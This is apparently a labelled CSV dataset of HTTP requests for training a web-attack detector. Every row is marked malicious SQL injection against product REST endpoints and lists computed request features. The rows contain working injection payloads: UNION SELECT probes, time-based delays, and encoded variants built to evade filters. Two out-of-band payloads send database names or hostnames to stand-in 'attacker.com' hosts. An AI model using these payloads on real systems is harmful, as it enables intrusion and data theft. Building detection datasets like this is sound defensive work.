RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek,Unnamed: 59,Unnamed: 60,Unnamed: 61,Unnamed: 62,Unnamed: 63,Unnamed: 64,Unnamed: 65,Unnamed: 66,Unnamed: 67,Unnamed: 68,Unnamed: 69,Unnamed: 70,Unnamed: 71,Unnamed: 72
PUT,/rest/products/6,,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:112,"{""name"": ""Attacked Product"", ""description"": ""New desc ' UNION SELECT NULL, NULL, NULL, database(), NULL, NULL#""}",,malicious,sqli,380,16,0,112,2,65,25,0,0,0.1953,5,39,TRUE,FALSE,FALSE,TRUE,3,TRUE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:361,"{""name"": ""&#x41;&#x74;&#x74;&#x61;&#x63;&#x6b;&#x65;&#x64;&#x20;&#x50;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;"", ""description"": ""%4e%65%77%20%64%65%73%63%20%27%20%41%4e%44%20%55%54%4c%5f%48%54%54%50%2e%52%45%51%55%45%53%54%28%27%68%74%74%70%3a%2f%2f%65%78%66%69%6c%2d%32%35%34%2e%61%74%74%61%63%6b%65%72%2e%63%6f%6d%2f%27%7c%7c%64%61%74%61%62%61%73%65%28%29%29%23""}",,malicious,sqli,607,17,0,361,2,234,142,78,0,0.3757,1,37,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%27+AND+TRUE+AND+SLEEP%284%29--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,231,21,34,0,1,25,10,3,0,0.1818,2,32,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/4,,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:113,"{""name"": ""Attacked Product"", ""description"": ""New desc ' UNION SELECT NULL, database(), NULL, NULL, NULL, NULL/*""}",,malicious,sqli,366,16,0,113,2,66,26,0,0,0.2016,5,39,TRUE,FALSE,FALSE,TRUE,3,FALSE,FALSE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%2527%2BUNION%2BSELECT%2BNULL%252C%2Bversion%2528%2529%252C%2BNULL--,HTTP/1.1,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,298,21,71,0,1,48,13,10,5,0.1413,2,33,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%27+UNION+SELECT+NULL%2C+NULL%2C+NULL%2C+version%28%29%2F%2A,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,300,21,63,0,1,44,17,8,0,0.2024,2,33,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,id=%2527%2BanD%2B%2527f%2527%253D%2527f%2527%2BanD%2BWAitFor%2BdElay%2B%25270%253A0%253A3%2527--,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,293,21,96,0,1,61,19,16,10,0.1624,0,31,FALSE,FALSE,FALSE,FALSE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/search,query=%27+UNION+SELECT+NULL%2C+version%28%29%2C+NULL%23,HTTP/1.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,292,21,55,0,1,37,14,6,0,0.1842,2,34,FALSE,FALSE,FALSE,FALSE,3,TRUE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
GET,/rest/products/1,id=%2527%2BanD%2B%2528seleCt%2BlOad_File%2528cOnCat%2528%2527%255C%255C%2527%252C%2528seLEcT%2B%2540%2540hOstnAME%2529%252C%2527.ExFil-599.ATtaCker.com%255CaBC%2527%2529%2529%2529%252F%252A,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,sqli,427,16,189,0,1,134,33,26,22,0.161,5,41,FALSE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,4,3,Tuesday,,,,,,,,,,,,,,
PUT,/rest/products/10,,HTTP/1.1,"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:232,"{""name"": ""Attacked%2BProduct"", ""description"": ""%4e%65%77%20%64%65%73%63%20%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%20%75%73%65%72%28%29%2c%20%4e%55%4c%4c%2c%20%4e%55%4c%4c%2c%20%4e%55%4c%4c%2c%20%4e%55%4c%4c%20""}",,malicious,sqli,517,17,0,232,2,183,78,62,0,0.3133,1,36,TRUE,FALSE,FALSE,TRUE,3,FALSE,TRUE,FALSE,FALSE,6,3,Tuesday,,,,,,,,,,,,,,
